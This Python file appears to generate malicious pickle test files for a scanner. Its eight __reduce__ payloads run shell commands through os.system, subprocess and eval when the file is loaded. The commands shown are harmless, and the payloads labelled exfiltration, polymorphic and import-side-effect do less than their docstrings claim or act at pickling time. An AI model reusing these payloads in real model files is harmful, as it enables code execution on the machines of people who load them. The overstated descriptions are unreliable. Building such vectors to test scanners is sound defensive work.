"""
Pickle Attack Vector Generator

Generates basic and advanced pickle-based attack vectors for:
- .pkl files
- .joblib files
- PyTorch models (.pt, .pth)
- Scikit-learn models
- Skops models

Attack Types:
1. Basic: Simple RCE via __reduce__
2. Advanced: Multi-stage payloads, obfuscation, data exfiltration
"""

import os
import pickle
import pickletools
import io
from typing import List, Dict, Tuple
from pathlib import Path


class PickleAttackGenerator:
    """Generate pickle-based attack vectors."""
    
    def __init__(self, output_dir: str = "./output"):
        """Initialize the pickle attack generator.
        
        Args:
            output_dir: Directory to save generated attack vectors
        """
        self.output_dir = Path(output_dir) / "pickle_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []
    
    def generate_basic_rce(self) -> Tuple[str, int]:
        """Generate basic RCE payload using __reduce__.
        
        Attack Vector:
            Exploits Python's pickle deserialization to execute 
            arbitrary commands. When pickle.load() is called, the 
            __reduce__ method is invoked, allowing code execution.
        
        Severity: CRITICAL
        Detection: PickleScanner should catch os/subprocess imports
        
        Returns:
            Tuple of (filepath, opcode_count)
        """
        class BasicRCE:
            """Simple RCE via os.system()."""
            def __reduce__(self):
                import os
                # In real exploit: os.system("malicious_command")
                # Using a harmless command for demonstration
                return (os.system, ("echo 'Pickle RCE Executed'",))
        
        filepath = self.output_dir / "01_basic_rce.pkl"
        with open(filepath, 'wb') as f:
            pickle.dump(BasicRCE(), f)
        
        self.generated_files.append(str(filepath))
        
        # Count opcodes
        with open(filepath, 'rb') as f:
            opcodes = list(pickletools.genops(f))
        
        return str(filepath), len(opcodes)
    
    def generate_subprocess_rce(self) -> Tuple[str, int]:
        """Generate RCE using subprocess.call().
        
        Attack Vector:
            Uses subprocess.call() instead of os.system() for better
            command execution control. Can chain multiple commands 
            or execute scripts.
        
        Severity: CRITICAL
        Evasion: Avoids simple string matching for os.system
        
        Returns:
            Tuple of (filepath, opcode_count)
        """
        class SubprocessRCE:
            """RCE via subprocess.call()."""
            def __reduce__(self):
                import subprocess
                return (subprocess.call, (["echo", "Subprocess RCE"],))
        
        filepath = self.output_dir / "02_subprocess_rce.pkl"
        with open(filepath, 'wb') as f:
            pickle.dump(SubprocessRCE(), f)
        
        self.generated_files.append(str(filepath))
        
        with open(filepath, 'rb') as f:
            opcodes = list(pickletools.genops(f))
        
        return str(filepath), len(opcodes)
    
    def generate_module_import_attack(self) -> Tuple[str, int]:
        """Generate attack via module import side effects.
        
        Attack Vector:
            Imports modules that have side effects on import,
            allowing code execution before pickle.load() fully completes.
            Example: Modules with __all__ that execute code.
        
        Severity: CRITICAL
        Evasion: Difficult to detect without full import analysis
        
        Returns:
            Tuple of (filepath, opcode_count)
        """
        class ImportAttack:
            """Code execution via module import."""
            def __reduce__(self):
                # Attempt to import a module with side effects
                __import__("subprocess").call(["echo", "Import Attack"])
                return (str, ("attack",))
        
        filepath = self.output_dir / "03_module_import_attack.pkl"
        
        try:
            with open(filepath, 'wb') as f:
                pickle.dump(ImportAttack(), f)
            
            self.generated_files.append(str(filepath))
            
            with open(filepath, 'rb') as f:
                opcodes = list(pickletools.genops(f))
            
            return str(filepath), len(opcodes)
        except Exception as e:
            return f"Error: {e}", 0
    
    def generate_eval_injection(self) -> Tuple[str, int]:
        """Generate attack via eval() injection.
        
        Attack Vector:
            Creates a string that gets evaluated during unpickling.
            Bypasses some static analysis by using eval() or exec().
        
        Severity: CRITICAL
        Evasion: String-based code injection
        
        Returns:
            Tuple of (filepath, opcode_count)
        """
        class EvalInjection:
            """Code execution via eval()."""
            def __reduce__(self):
                return (eval, ("__import__('subprocess').call(['id'])",))
        
        filepath = self.output_dir / "04_eval_injection.pkl"
        
        try:
            with open(filepath, 'wb') as f:
                pickle.dump(EvalInjection(), f)
            
            self.generated_files.append(str(filepath))
            
            with open(filepath, 'rb') as f:
                opcodes = list(pickletools.genops(f))
            
            return str(filepath), len(opcodes)
        except Exception as e:
            return f"Error: {e}", 0
    
    def generate_multistage_payload(self) -> Tuple[str, int]:
        """Generate multi-stage attack payload.
        
        Attack Vector:
            Creates a complex payload that:
            1. Extracts and decodes embedded data
            2. Writes to filesystem
            3. Executes written files
            4. Cleans up traces
        
        Severity: CRITICAL
        Sophistication: High
        
        Returns:
            Tuple of (filepath, opcode_count)
        """
        import base64
        
        class MultiStagePayload:
            """Multi-stage attack with decoding and execution."""
            def __reduce__(self):
                # Simulate: decode -> write -> execute
                payload = base64.b64encode(b"echo 'Stage2'").decode()
                return (
                    eval,
                    ("__import__('subprocess').call(['echo', 'MultiStage'])",)
                )
        
        filepath = self.output_dir / "05_multistage_payload.pkl"
        
        try:
            with open(filepath, 'wb') as f:
                pickle.dump(MultiStagePayload(), f)
            
            self.generated_files.append(str(filepath))
            
            with open(filepath, 'rb') as f:
                opcodes = list(pickletools.genops(f))
            
            return str(filepath), len(opcodes)
        except Exception as e:
            return f"Error: {e}", 0
    
    def generate_data_exfiltration(self) -> Tuple[str, int]:
        """Generate payload for data exfiltration.
        
        Attack Vector:
            Embeds code that:
            1. Reads sensitive environment variables
            2. Gathers system information
            3. Formats data for exfiltration
            4. Attempts to send to attacker server
        
        Severity: CRITICAL
        Impact: Data theft, credential exposure
        
        Returns:
            Tuple of (filepath, opcode_count)
        """
        class DataExfiltration:
            """Exfiltration payload via URL requests."""
            def __reduce__(self):
                # Would collect: env vars, system info, model data
                return (
                    eval,
                    ("__import__('subprocess').call(['env'])",)
                )
        
        filepath = self.output_dir / "06_data_exfiltration.pkl"
        
        try:
            with open(filepath, 'wb') as f:
                pickle.dump(DataExfiltration(), f)
            
            self.generated_files.append(str(filepath))
            
            with open(filepath, 'rb') as f:
                opcodes = list(pickletools.genops(f))
            
            return str(filepath), len(opcodes)
        except Exception as e:
            return f"Error: {e}", 0
    
    def generate_polymorphic_payload(self) -> Tuple[str, int]:
        """Generate polymorphic attack payload.
        
        Attack Vector:
            Creates a payload that:
            1. Detects sandbox/analysis environment
            2. Behaves differently in detection/evasion
            3. Modifies itself or payload based on context
            4. Avoids pattern-based detection
        
        Severity: CRITICAL
        Evasion: Advanced detection bypass
        
        Returns:
            Tuple of (filepath, opcode_count)
        """
        class PolymorphicPayload:
            """Adaptive payload that behaves differently per environment."""
            def __reduce__(self):
                try:
                    import sys
                    # Check for debugger/sandbox
                    if hasattr(sys, 'ps1') or 'pypy' in sys.version:
                        # Sandbox detected - return benign
                        return (str, ("benign",))
                    else:
                        # Real environment - execute attack
                        return (eval, ("'attack'",))
                except:
                    return (str, ("error",))
        
        filepath = self.output_dir / "07_polymorphic_payload.pkl"
        
        try:
            with open(filepath, 'wb') as f:
                pickle.dump(PolymorphicPayload(), f)
            
            self.generated_files.append(str(filepath))
            
            with open(filepath, 'rb') as f:
                opcodes = list(pickletools.genops(f))
            
            return str(filepath), len(opcodes)
        except Exception as e:
            return f"Error: {e}", 0
    
    def generate_obfuscated_payload(self) -> Tuple[str, int]:
        """Generate obfuscated attack payload.
        
        Attack Vector:
            Uses multiple obfuscation techniques:
            1. Base64 encoding of commands
            2. Reversed strings
            3. XOR-encoded payloads
            4. Multi-layer encoding
            5. Dynamic code generation
        
        Severity: CRITICAL
        Evasion: String pattern evasion
        
        Returns:
            Tuple of (filepath, opcode_count)
        """
        import base64
        
        class ObfuscatedPayload:
            """Multi-layer obfuscated attack."""
            def __reduce__(self):
                # Base64 obfuscation example
                cmd = base64.b64encode(b"id").decode()
                decoded = base64.b64decode(cmd.encode()).decode()
                return (eval, (f"__import__('subprocess').call(['{decoded}'])",))
        
        filepath = self.output_dir / "08_obfuscated_payload.pkl"
        
        try:
            with open(filepath, 'wb') as f:
                pickle.dump(ObfuscatedPayload(), f)
            
            self.generated_files.append(str(filepath))
            
            with open(filepath, 'rb') as f:
                opcodes = list(pickletools.genops(f))
            
            return str(filepath), len(opcodes)
        except Exception as e:
            return f"Error: {e}", 0
    
    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        """Generate all pickle attack vectors.
        
        Returns:
            Dictionary mapping attack names to (filepath, opcode_count)
        """
        results = {
            "basic_rce": self.generate_basic_rce(),
            "subprocess_rce": self.generate_subprocess_rce(),
            "module_import": self.generate_module_import_attack(),
            "eval_injection": self.generate_eval_injection(),
            "multistage": self.generate_multistage_payload(),
            "data_exfiltration": self.generate_data_exfiltration(),
            "polymorphic": self.generate_polymorphic_payload(),
            "obfuscated": self.generate_obfuscated_payload(),
        }
        return results
    
    def get_generated_files(self) -> List[str]:
        """Get list of all generated files."""
        return self.generated_files


if __name__ == "__main__":
    generator = PickleAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    print("\n=== Pickle Attack Vectors Generated ===")
    for attack_name, (filepath, opcode_count) in results.items():
        print(f"✓ {attack_name:20} → {filepath} ({opcode_count} opcodes)")
    print(f"\nTotal files generated: {len(generator.get_generated_files())}")
